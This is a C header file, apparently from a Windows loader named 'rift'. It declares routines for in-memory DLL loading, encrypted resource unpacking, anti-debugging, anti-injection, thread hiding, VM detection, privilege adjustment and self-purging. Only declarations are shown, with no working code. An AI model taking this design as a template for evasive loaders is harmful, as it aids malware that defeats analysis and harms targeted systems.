#pragma once
#include "_rift_shared.h"
#include "MemoryModule.h"
#include "resource.h"

/* WinMain : main.c */
WCHAR g_szMFN[MAX_PATH];
WCHAR g_szCD[MAX_PATH];
HMODULE g_hMH;
VOID fnPurge();

/* _riftdll */
typedef BOOL(*pfnDllInit)(int);

/* Unpack Resource / Copressor and Crypto / UnpackRes.c */
PVOID fnUnpackResource(_In_ PCWSTR szInFN, _In_ WORD wResID, _Out_ PSIZE_T nData);

/* Xoshiro PRNG Algorithm : Xoshiro.c */
BOOL fnInitializeXSR();
VOID fnDeleteXSR();

DWORD fnNext128ss();
DWORD fnNext128p();
UINT  fnURID(_In_ UINT uiMin, _In_ UINT uiMax);
FLOAT fnURRD();

/* Anti-ReverseEngineering : AntiDebug.c, AnitDllInject.c, AntiRE.c */
BOOL fnAntiRE();
BOOL fnAntiDebug();
BOOL fnAntiDllInject();
BOOL HideThread(_In_opt_ HANDLE hThread);

/* VMDetection : VMDetect.c */
BOOL fnCheckVMPresent();

/* ConsoleHost : Console.c */
BOOL fnOpenConsole();

/* NT Functions : NT.c */
BOOL fnAdjustPrivilege(_In_ PCWSTR lpszPrivilege, _In_ BOOL bEnablePrivilege);

/* FileSystem Tools : FileSytsem.c */
BOOL fnWriteFileW(_In_ PCWSTR pFileName, _In_ PVOID pBuffer, _In_ SIZE_T nBuffer);
PCWSTR fnGetFileNameFromPathW(_In_ PCWSTR pPath);

/* Random : Random.c */
PCWSTR fnAllocRandomStringW(_In_ SIZE_T nMin, _In_opt_ SIZE_T nMax, _Out_ PSIZE_T nLen);